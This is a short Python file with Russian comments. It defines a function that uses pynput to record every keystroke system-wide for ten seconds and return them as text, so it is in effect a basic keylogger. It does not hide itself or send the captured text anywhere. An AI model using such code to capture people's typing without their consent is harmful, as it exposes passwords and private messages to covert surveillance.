from pynput import keyboard
import time

def run():
    log = []
    
    def on_press(key):
        try:
            log.append(str(key.char))
        except AttributeError:
            log.append(f"[{key}]")

    # Запускаем слушатель клавиатуры
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    # Записываем 10 секунд (можно изменить)
    time.sleep(10)
    listener.stop()
    
    return "".join(log)